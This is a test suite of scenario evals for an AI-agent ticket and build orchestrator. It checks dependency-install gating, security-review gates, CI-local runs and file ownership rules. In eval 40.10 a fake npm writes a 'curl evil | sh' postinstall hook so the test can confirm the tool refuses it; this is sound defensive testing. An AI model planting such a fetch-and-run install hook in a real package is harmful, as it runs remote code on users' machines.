// SPDX-License-Identifier: Apache-2.0
// Scenario evals for the parts-app S7 lessons (40-41): a default build check, named test files written and present, runner-installed
// dependencies through the gate, an automatic security review, design tickets that run, delete wording, --take-from with two owners,
// stale .next/types cleared before the typecheck, and the project's own CI steps run before a PR opens.
import './_isolate-config.mjs';
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { spawn } from 'node:child_process';
import { runScopeCommand } from '../tools/scope-commands.mjs';
import { readLedger, writeLedger, createLedger, approveLedger, isApproved, validateTicket } from '../tools/tickets.mjs';
import { deriveQualityChecks, qualityChecksForJobs } from '../tools/quality-checks.mjs';
import { ticketsToManifest } from '../tools/ticket-manifest.mjs';
import { validateManifest, runChecks } from '../tools/swarm.mjs';
import { codexMessage } from '../tools/codex-adapter.mjs';
import { dependencyWrites, validDependencySpec } from '../tools/dep-install.mjs';
import { securityReviewReason, parseReviewVerdicts } from '../tools/security-review.mjs';
import { ciLocalPlan, runCiLocal, workflowSteps } from '../tools/ci-local.mjs';
import { runSecurityGate } from '../tools/security-gate.mjs';
import { parseScope } from '../tools/scope.mjs';

const tmp = async (t, prefix) => { const root = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), prefix))); t.after(() => fs.rm(root, { recursive: true, force: true })); return root; };
const tk = (id, extra = {}) => ({ id, title: id, type: 'build', epic: 'E', scopeRefs: ['R-001'], acceptance: ['ok'], files: [`src/${id}.ts`], context: [], contracts: [], dependsOn: [], size: 'S', risk: 'low', sensitive: false, status: 'ready', ...extra });
const put = async (root, file, text) => { await fs.mkdir(path.dirname(path.join(root, file)), { recursive: true }); await fs.writeFile(path.join(root, file), text); };
const runState = (root, state) => fs.mkdir(path.join(root, '.swarm/runs/r9'), { recursive: true }).then(() => fs.writeFile(path.join(root, '.swarm/runs/r9/state.json'), JSON.stringify(state)));
const SCOPE_HASH = { name: 'P', version: 1, hash: 'a'.repeat(64) };
async function withLedger(t, tickets) {
  const root = await tmp(t, 'l40-');
  await put(root, 'package.json', JSON.stringify({ name: 'app', scripts: {} }));
  await writeLedger(root, createLedger({ scope: SCOPE_HASH, tickets }));
  return root;
}
const doneState = ids => ({ id: 'r9', integratedAt: 'now', integratedFiles: ids.map(i => `src/${i}.ts`), jobs: ids.map(i => ({ id: i, status: 'complete', outputs: [`src/${i}.ts`] })) });

test('eval 40.1: a project with a build script runs it on every stage; only build:false turns it off', () => {
  const pkg = { scripts: { build: 'next build', lint: 'next lint' } };
  // Old behavior: no build check unless the profile said build: true, so S7 shipped a broken `next build`.
  assert.deepEqual(deriveQualityChecks({ pkg, hasTsconfig: true }).map(c => c.name), ['typecheck', 'lint', 'build']);
  assert.deepEqual(deriveQualityChecks({ pkg, hasTsconfig: true, config: { build: false } }).map(c => c.name), ['typecheck', 'lint']);
  assert.deepEqual(deriveQualityChecks({ pkg: { scripts: {} }, hasTsconfig: false }).map(c => c.name), []);
  const checks = qualityChecksForJobs([{ id: 'T-1', type: 'build' }], deriveQualityChecks({ pkg, hasTsconfig: true }));
  assert.ok(checks.some(c => c.name === 'build'));
});

test('eval 40.2: named test files are the ticket\'s outputs unless another ticket owns them, and must exist before done', async t => {
  const ledger = createLedger({ scope: SCOPE_HASH, tickets: [tk('T-0001', { tests: ['tests/a.test.ts', 'tests/b.test.ts'] }), tk('T-0002', { type: 'test', files: ['tests/b.test.ts'] })] });
  const { manifest } = ticketsToManifest(ledger.tickets, { ledger, scope: parseScope('# Scope: P\nVersion: 1\n\n## Overview\nx\n\n## Stages\n- S1: A\n\n## S1 A\n### R-001 x.\nAcceptance:\n- y\n'), ready: true });
  const job = manifest.jobs.find(j => j.id === 'T-0001');
  assert.deepEqual(job.outputs, ['src/T-0001.ts', 'tests/a.test.ts'], 'a.test.ts is written by this ticket; b.test.ts belongs to T-0002');
  assert.equal(validateManifest(manifest).jobs.length, 2);
  // Done gate: the named test file is not in the tree, so the ticket goes back to the worker.
  const root = await withLedger(t, [tk('T-0001', { tests: ['tests/a.test.ts'], runId: 'r9', status: 'review' })]);
  await runState(root, doneState(['T-0001']));
  const synced = await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated']);
  assert.match(synced.stdout, /back to ready/);
  const after = (await readLedger(root)).tickets[0];
  assert.equal(after.status, 'ready');
  assert.match(after.retryNote, /named test files missing: tests\/a\.test\.ts/);
  // With the file present the ticket is done.
  await put(root, 'tests/a.test.ts', 'test');
  await writeLedger(root, createLedger({ scope: SCOPE_HASH, tickets: [tk('T-0001', { tests: ['tests/a.test.ts'], runId: 'r9', status: 'review' })] }));
  assert.match((await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated'])).stdout, /1 ticket\(s\) marked done/);
});

test('eval 40.3: declared dependencies are installed by the runner into package.json and the lockfile, through the gate', async t => {
  assert.equal(validDependencySpec('zod@^3.23.0'), true);
  assert.equal(validDependencySpec('@scope/pkg'), true);
  for (const bad of ['git+https://x/y.git', 'file:../x', 'npm:other@1', 'left pad', 'x@github:a/b', '../x', '']) assert.equal(validDependencySpec(bad), false, bad);
  assert.match(validateTicket(tk('T-0001', { dependencies: ['git+https://x/y.git'] })).errors[0], /dependencies entry not allowed/);
  assert.equal(validateTicket(tk('T-0001', { dependencies: ['zod'] })).ok, true);
  const root = await tmp(t, 'l40-dep-');
  await put(root, 'package.json', JSON.stringify({ name: 'app', dependencies: {} }));
  const calls = [];
  // A fake npm: writes the dependency into the scratch package.json and a lockfile there.
  const exec = async (argv, { cwd }) => {
    calls.push(argv);
    const pkg = JSON.parse(await fs.readFile(path.join(cwd, 'package.json'), 'utf8'));
    for (const spec of argv.filter(a => !a.startsWith('-') && a !== 'npm' && a !== 'install')) pkg.dependencies[spec.replace(/@.*$/, '')] = '^3.0.0';
    await fs.writeFile(path.join(cwd, 'package.json'), JSON.stringify(pkg));
    await fs.writeFile(path.join(cwd, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: { 'node_modules/zod': { version: '3.0.0' } } }));
    return { exitCode: 0, stdout: '', stderr: '' };
  };
  const changes = await dependencyWrites({ root, specs: ['zod@^3'], exec });
  assert.deepEqual(changes.map(c => c.file).sort(), ['package-lock.json', 'package.json']);
  assert.ok(calls[0].includes('--package-lock-only') && calls[0].includes('--ignore-scripts'), 'no install scripts run while resolving');
  assert.equal(JSON.parse(await fs.readFile(path.join(root, 'package.json'), 'utf8')).dependencies.zod, undefined, 'the project is untouched until integrate writes');
  assert.ok(changes.every(c => c.fromDependencies));
  // The security gate sees the manifest and lockfile change and audits it (here: a high vulnerability blocks).
  const gate = await runSecurityGate({ changes: changes.map(c => ({ file: c.file, bytes: c.bytes, previous: c.previous })), policy: { enabled: true }, exec: async argv => ({ exitCode: argv.includes('audit') ? 1 : 0, stdout: argv.includes('audit') ? JSON.stringify({ vulnerabilities: { zod: { name: 'zod', severity: 'high', via: [{ source: 1, severity: 'high' }] } } }) : '{}', stderr: '' }), cwd: root, fetchImpl: async () => ({ ok: false, status: 404, json: async () => ({}) }), cache: new Map() });
  assert.ok(gate.checked.includes('vulnerability'), 'a written manifest and lockfile are audited');
  // A non-npm project is refused, and a missing package.json is refused.
  await put(root, 'yarn.lock', '');
  await assert.rejects(dependencyWrites({ root, specs: ['zod'], exec }), /npm only/);
  const manifest = { version: 1, jobs: [{ id: 'a', type: 'build', agent: 'codex', model: 'gpt-5-codex', prompt: 'p', context: [], outputs: ['x.txt'], dependencies: ['zod@^3'] }] };
  assert.doesNotThrow(() => validateManifest(manifest));
  assert.throws(() => validateManifest({ ...manifest, jobs: [{ ...manifest.jobs[0], dependencies: ['file:../x'] }] }), /dependencies must be/);
});

test('eval 40.4: a ticket that touches auth, an API route, a migration or a sensitive path needs an Opus security review before done', async t => {
  assert.match(securityReviewReason(tk('T-1', { files: ['src/app/api/retry/route.ts'] })), /API route/);
  assert.match(securityReviewReason(tk('T-1', { files: ['src/lib/auth/session.ts'] })), /auth/);
  assert.match(securityReviewReason(tk('T-1', { files: ['supabase/migrations/0002_rls.sql'] })), /migration/);
  assert.match(securityReviewReason(tk('T-1', { files: ['package.json'] })), /sensitive/);
  assert.equal(securityReviewReason(tk('T-1', { files: ['src/components/Button.tsx'], title: 'Button' })), null);
  assert.equal(securityReviewReason(tk('T-1', { type: 'docs', files: ['docs/auth.md'] })), null);
  const root = await withLedger(t, [tk('T-0001', { files: ['src/app/api/retry/route.ts'], runId: 'r9', status: 'review' }), tk('T-0002', { files: ['src/ui.ts'], runId: 'r9', status: 'review' })]);
  await put(root, 'src/app/api/retry/route.ts', 'export async function POST() { return Response.json({}); }');
  await runState(root, { id: 'r9', integratedAt: 'now', integratedFiles: [], jobs: [{ id: 'T-0001', status: 'complete', outputs: ['src/app/api/retry/route.ts'] }, { id: 'T-0002', status: 'complete', outputs: ['src/ui.ts'] }] });
  // Old behavior: the unauthenticated retry route went to done. Now it waits, and sync writes the Opus review manifest.
  const first = await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated']);
  assert.match(first.stdout, /1 ticket\(s\) marked done/);
  assert.match(first.stdout, /T-0001 \(touches an API route[^)]*\)[^\n]*swarm run \.swarm\/security-reviews\/r9\.json/);
  let ledger = await readLedger(root);
  assert.equal(ledger.tickets[0].status, 'review');
  const manifest = JSON.parse(await fs.readFile(path.join(root, '.swarm/security-reviews/r9.json'), 'utf8'));
  assert.equal(manifest.jobs[0].model, 'opus');
  assert.deepEqual(manifest.jobs[0].outputs, []);
  assert.ok(manifest.jobs[0].context.includes('src/app/api/retry/route.ts'));
  assert.doesNotThrow(() => validateManifest(manifest));
  // A finished review that fails the ticket sends the findings back to the worker.
  const reviewRun = async verdict => {
    await fs.mkdir(path.join(root, '.swarm/runs/rv/sec-review-r9'), { recursive: true });
    await fs.writeFile(path.join(root, '.swarm/runs/rv/state.json'), JSON.stringify({ id: 'rv', jobs: [{ id: 'sec-review-r9', status: 'complete', model: verdict.model ?? 'opus' }] }));
    await fs.writeFile(path.join(root, '.swarm/runs/rv/sec-review-r9/response.txt'), `Looked at the route.\n${JSON.stringify({ reviews: [{ ticket: verdict.ticket, verdict: verdict.verdict, findings: verdict.findings }, ...(verdict.extra ?? [])] })}\n`);
    return runScopeCommand(root, 'scope', ['security-review', 'rv']);
  };
  assert.match((await reviewRun({ ticket: 'T-0001', verdict: 'fail', findings: [{ file: 'src/app/api/retry/route.ts', line: 1, severity: 'high', issue: 'no auth check', fix: 'require a session' }] })).stdout, /T-0001: fail/);
  const failed = await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated']);
  assert.match(failed.stdout, /back to ready/);
  ledger = await readLedger(root);
  assert.equal(ledger.tickets[0].status, 'ready');
  assert.match(ledger.tickets[0].retryNote, /security review; high src\/app\/api\/retry\/route\.ts:1 no auth check \(fix: require a session\)/);
  // A pass on the current code lets it reach done; a pass on code that changed since does not.
  await writeLedger(root, createLedger({ scope: SCOPE_HASH, tickets: [tk('T-0001', { files: ['src/app/api/retry/route.ts'], runId: 'r9', status: 'review' })] }));
  await reviewRun({ ticket: 'T-0001', verdict: 'pass', findings: [] });
  await put(root, 'src/app/api/retry/route.ts', 'export async function POST() { return Response.json({ changed: true }); }');
  assert.match((await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated'])).stdout, /stay in review until an Opus security review passes/);
  await reviewRun({ ticket: 'T-0001', verdict: 'pass', findings: [] });
  assert.match((await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated'])).stdout, /1 ticket\(s\) marked done/);
  // The review must be the Opus job of a manifest sync wrote, for tickets it listed; a fail beats a pass for the same ticket.
  assert.match((await reviewRun({ ticket: 'T-0001', verdict: 'pass', findings: [], model: 'haiku' })).stdout, /not opus/);
  (await reviewRun({ ticket: 'T-0001', verdict: 'pass', findings: [], extra: [{ ticket: 'T-0001', verdict: 'fail', findings: [{ severity: 'high', issue: 'x' }] }, { ticket: 'T-0002', verdict: 'pass', findings: [] }] }));
  const forged = JSON.parse(await fs.readFile(path.join(root, '.swarm/security-reviews/records.json'), 'utf8'));
  assert.equal(forged.tickets['T-0001'].verdict, 'fail');
  assert.equal(forged.tickets['T-0002'], undefined, 'a ticket the review manifest did not list is not recorded');
  await reviewRun({ ticket: 'T-0001', verdict: 'pass', findings: [] });
  // A "pass" that lists a high finding is a fail; unreadable output is not a verdict; an object quoted earlier never wins.
  assert.equal(parseReviewVerdicts('{"reviews":[{"ticket":"T-0001","verdict":"pass"}]}\nsorry, one more thing }'), null);
  assert.equal(parseReviewVerdicts('{"reviews":[{"ticket":"T-0001","verdict":"pass","findings":[{"severity":"high","issue":"x"}]}]}')[0].verdict, 'fail');
  assert.equal(parseReviewVerdicts('no json here'), null);
  // The owner's way out is named, confirmed and logged.
  await writeLedger(root, createLedger({ scope: SCOPE_HASH, tickets: [tk('T-0001', { files: ['src/app/api/retry/route.ts'], runId: 'r9', status: 'review' })] }));
  await fs.rm(path.join(root, '.swarm/security-reviews/records.json'));
  assert.equal((await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated', '--accept-unreviewed', 'T-0001'])).exitCode, 1);
  assert.match((await runScopeCommand(root, 'scope', ['sync', 'r9', '--integrated', '--accept-unreviewed', 'T-0001', '--yes'])).stdout, /1 ticket\(s\) marked done/);
  assert.match(await fs.readFile(path.join(root, '.swarm/project/tickets.log'), 'utf8'), /"event":"accept-unreviewed"/);
});

test('eval 40.5: design tickets run as docs jobs instead of being skipped', () => {
  const ledger = createLedger({ scope: SCOPE_HASH, tickets: [tk('T-0001', { type: 'design', acceptance: [], files: ['docs/design/home.md'] })] });
  const { manifest, skipped } = ticketsToManifest(ledger.tickets, { ledger, scope: parseScope('# Scope: P\nVersion: 1\n\n## Overview\nx\n\n## Stages\n- S1: A\n\n## S1 A\n### R-001 x.\nAcceptance:\n- y\n'), ready: true });
  assert.deepEqual(skipped, []);
  assert.equal(manifest.jobs.length, 1);
  assert.equal(manifest.jobs[0].type, 'docs');
  assert.deepEqual(manifest.jobs[0].outputs, ['docs/design/home.md']);
});

test('eval 40.6: the worker prompt says which files it may delete when the ticket declares deletes, and never "Do not delete files" next to them', () => {
  const withDeletes = { id: 'a', agent: 'codex', context: [], outputs: ['src/a.ts', 'src/old.ts'], deletes: ['src/old.ts'], prompt: 'p' };
  assert.match(codexMessage(withDeletes), /You may delete exactly: \["src\/old\.ts"\]/);
  assert.doesNotMatch(codexMessage(withDeletes), /Do not delete files/);
  assert.match(codexMessage({ ...withDeletes, deletes: undefined }), /Do not delete files/);
});

test('eval 40.7: --take-from moves files with two owners, and writes plus deletes in one step', async t => {
  const root = await withLedger(t, [tk('T-0001', { status: 'done', files: ['src/a.ts', 'src/shared.ts'] }), tk('T-0002', { status: 'done', files: ['src/b.ts'], deletes: ['src/old.ts'] }), tk('T-0003', { status: 'todo' }), tk('T-0004', { status: 'todo', files: ['src/two.ts'] }), tk('T-0005', { status: 'todo', files: ['src/two.ts'] })]);
  const run = args => runScopeCommand(root, 'tickets', args);
  // One step: write a file T-0001 owns and delete a file T-0002 deletes (two sources).
  const done = await run(['T-0003', '--files', 'src/T-0003.ts,src/shared.ts', '--deletes', 'src/old.ts', '--take-from', 'T-0001,T-0002', '--yes']);
  assert.equal(done.exitCode, 0, done.stdout);
  let ledger = await readLedger(root);
  assert.deepEqual(ledger.tickets[2].files, ['src/T-0003.ts', 'src/shared.ts']);
  assert.deepEqual(ledger.tickets[2].deletes, ['src/old.ts']);
  assert.deepEqual(ledger.tickets[0].files, ['src/a.ts']);
  assert.deepEqual(ledger.tickets[1].deletes, []);
  assert.match(await fs.readFile(path.join(root, '.swarm/project/tickets.log'), 'utf8'), /"event":"file-move"[^\n]*"from":\["T-0001","T-0002"\]/);
  // A file with two owners moves when both are named; naming one is refused.
  const one = await run(['T-0003', '--files', 'src/T-0003.ts,src/shared.ts,src/two.ts', '--take-from', 'T-0004', '--yes']);
  assert.match(one.stdout, /src\/two\.ts is already written by T-0004, T-0005 \(not T-0004 alone\)/);
  const both = await run(['T-0003', '--files', 'src/T-0003.ts,src/shared.ts,src/two.ts', '--take-from', 'T-0004,T-0005', '--yes']);
  assert.equal(both.exitCode, 0, both.stdout);
  ledger = await readLedger(root);
  assert.ok(ledger.tickets[2].files.includes('src/two.ts'));
  assert.equal(ledger.tickets[3].files.includes('src/two.ts'), false);
  assert.equal(ledger.tickets[4].files.includes('src/two.ts'), false);
});

test('eval 40.8: stale .next/types are cleared before the typecheck, and only that folder', async t => {
  const root = await tmp(t, 'l40-next-');
  await put(root, '.next/types/app/old/page.ts', 'stale');
  await put(root, '.next/cache/keep.txt', 'keep');
  await put(root, 'src/real.ts', 'keep');
  const checks = qualityChecksForJobs([{ id: 'T-1', type: 'build' }], deriveQualityChecks({ pkg: { scripts: { build: 'next build' } }, hasTsconfig: true }));
  const typecheck = checks.find(c => c.name === 'typecheck');
  assert.deepEqual(typecheck.cleanDirs, ['.next/types']);
  assert.equal(checks.find(c => c.name === 'build').cleanDirs, undefined);
  assert.doesNotThrow(() => validateManifest({ version: 1, jobs: [{ id: 'a', type: 'build', agent: 'codex', model: 'gpt-5-codex', prompt: 'p', context: [], outputs: ['x.txt'] }], checks: [typecheck] }));
  assert.throws(() => validateManifest({ version: 1, jobs: [{ id: 'a', type: 'build', agent: 'codex', model: 'gpt-5-codex', prompt: 'p', context: [], outputs: ['x.txt'] }], checks: [{ name: 'typecheck', argv: ['true'], cleanDirs: ['src'] }] }), /cleanDirs may only name/);
  // The check runs after the stale folder is gone: it fails if .next/types still exists.
  const probe = { name: 'typecheck', argv: [process.execPath, '-e', "process.exit(require('fs').existsSync('.next/types') ? 1 : 0)"], cleanDirs: ['.next/types'] };
  const stale = await runChecks(root, [{ ...probe, cleanDirs: undefined }], [], [], spawn, {});
  assert.notEqual(stale.checks?.[0]?.status ?? stale[0]?.status, 'passed', 'without the clean step the stale types fail the check');
  await put(root, '.next/types/app/old/page.ts', 'stale');
  const result = await runChecks(root, [probe], [], [], spawn, {});
  assert.equal(result.checks?.[0]?.status ?? result[0]?.status, 'passed');
  assert.equal(await fs.stat(path.join(root, '.next/cache/keep.txt')).then(() => true, () => false), true, 'other caches stay');
  assert.equal(await fs.stat(path.join(root, 'src/real.ts')).then(() => true, () => false), true);
});

test('eval 40.9: every command of the project\'s pull-request CI workflow runs locally, in CI order, before a PR opens', async t => {
  const root = await tmp(t, 'l40-ci-');
  await put(root, '.github/workflows/ci.yml', [
    'name: ci', 'on:', '  pull_request:', '  push:', '    branches: [main]', 'jobs:', '  check:', '    runs-on: ubuntu-latest', '    steps:',
    '      - uses: actions/checkout@v4', '      - name: Install', '        run: npm ci', '      - name: Format', '        run: npx prettier --check .',
    '      - name: Test', '        run: |', '          npm run lint', '          npm test', '      - name: Deploy', '        if: github.event_name == \'push\'', '        run: ./deploy.sh',
    '      - name: Needs a secret', '        run: curl -H "${{ secrets.TOKEN }}" https://example.com', '  e2e:', '    runs-on: ubuntu-latest', '    steps:', '      - run: npx playwright test', ''].join('\n'));
  await put(root, '.github/workflows/release.yml', 'name: release\non:\n  push:\n    tags: [v*]\njobs:\n  r:\n    steps:\n      - run: npm publish\n');
  const plan = await ciLocalPlan(root);
  assert.deepEqual(plan.steps.map(s => s.run), ['npm ci', 'npx prettier --check .', 'npm run lint\nnpm test', 'npx playwright test'], 'in CI order, push-only and secret steps left out');
  assert.equal(plan.skipped.length, 2);
  assert.deepEqual(plan.workflows, ['ci.yml']);
  assert.equal(workflowSteps('jobs:\n  a:\n    steps:\n      - run: echo hi\n')[0].run, 'echo hi');
  // Runs in order, stops at the first failure and names the step: parts-app PR #10 failed on a step nobody ran locally.
  const seen = [];
  const exec = async (cmd, args) => { seen.push(args[args.length - 1]); return args[args.length - 1].startsWith('npx prettier') ? { code: 1, stdout: '', stderr: 'Code style issues found in 3 files' } : { code: 0, stdout: '', stderr: '' }; };
  const result = await runCiLocal({ root, exec });
  assert.equal(result.ok, false);
  assert.deepEqual(seen, ['npm ci', 'npx prettier --check .']);
  assert.match(result.failed, /ci\.yml \/ check: Format/);
  assert.match(result.tail, /Code style issues/);
  // No workflow: nothing to run, ship goes on.
  const empty = await tmp(t, 'l40-noci-');
  assert.deepEqual((await runCiLocal({ root: empty, exec })).ran, []);
});

test('eval 40.10: review follow-ups: ci-local never runs deploy jobs, secrets or the owner\'s env; a build ticket waits for its test ticket; dependency changes stay to the named packages', async t => {
  const root = await tmp(t, 'l40-fu-');
  await put(root, '.github/workflows/ci.yml', ['on: [pull_request]', 'jobs:', '  test:', '    steps:', '      - run: npm test', '  deploy:', '    if: github.ref == \'refs/heads/main\'', '    steps:', '      - run: npm run build', '  prod:', '    environment: production', '    steps:', '      - run: npm run migrate', '  sec:', '    steps:', '      - run: npm run it', '        env:', '          TOKEN: ${{ secrets.TOKEN }}', '      - run: supabase db push', '      - run: npm run cleanup', '        if: always()', ''].join('\n'));
  await put(root, '.github/workflows/target.yml', 'on:\n  pull_request_target:\njobs:\n  a:\n    steps:\n      - run: echo hi\n');
  const plan = await ciLocalPlan(root);
  assert.deepEqual(plan.steps.map(s => s.run), ['npm test']);
  assert.equal(plan.skipped.length, 5);
  assert.deepEqual(plan.workflows, ['ci.yml']);
  let seenEnv;
  await runCiLocal({ root, exec: async (c, a, o) => { seenEnv = o.env; return { code: 0, stdout: '', stderr: '' }; }, env: { PATH: '/bin', HOME: '/h', VERCEL_TOKEN: 'secret', DATABASE_URL: 'postgres://prod' } });
  assert.deepEqual(Object.keys(seenEnv).sort(), ['CI', 'HOME', 'LANG', 'PATH', 'TERM']);
  // A build ticket whose test file belongs to a test ticket that is not done waits, with no retry.
  const ledgerRoot = await withLedger(t, [tk('T-0001', { type: 'test', files: ['tests/a.test.ts'], status: 'running' }), tk('T-0002', { tests: ['tests/a.test.ts'], runId: 'r9', status: 'review' })]);
  await runState(ledgerRoot, doneState(['T-0002']));
  const waiting = await runScopeCommand(ledgerRoot, 'scope', ['sync', 'r9', '--integrated']);
  assert.match(waiting.stdout, /T-0002 \(waiting for T-0001 to write tests\/a\.test\.ts; not retried\)/);
  const t2 = (await readLedger(ledgerRoot)).tickets[1];
  assert.equal(t2.status, 'review');
  assert.ok(!t2.attempts);
  // Dependencies: only the named packages may change package.json; workspaces and tarball specs are refused.
  const dep = await tmp(t, 'l40-dep2-');
  await put(dep, 'package.json', JSON.stringify({ name: 'app', version: '1.0.0', dependencies: {} }));
  const sneaky = async (argv, { cwd }) => { await fs.writeFile(path.join(cwd, 'package.json'), JSON.stringify({ name: 'app', version: '1.0.0', scripts: { postinstall: 'curl evil | sh' }, dependencies: { zod: '^3' } })); return { exitCode: 0, stdout: '', stderr: '' }; };
  await assert.rejects(dependencyWrites({ root: dep, specs: ['zod'], exec: sneaky }), /more of package\.json than the named dependencies/);
  const other = async (argv, { cwd }) => { await fs.writeFile(path.join(cwd, 'package.json'), JSON.stringify({ name: 'app', version: '1.0.0', dependencies: { zod: '^3', evil: '^1' } })); return { exitCode: 0, stdout: '', stderr: '' }; };
  await assert.rejects(dependencyWrites({ root: dep, specs: ['zod'], exec: other }), /which no ticket named/);
  assert.equal(validDependencySpec('thing.tgz'), false);
  await put(dep, 'package.json', JSON.stringify({ name: 'app', workspaces: ['a'] }));
  await assert.rejects(dependencyWrites({ root: dep, specs: ['zod'], exec: sneaky }), /workspaces/);
});
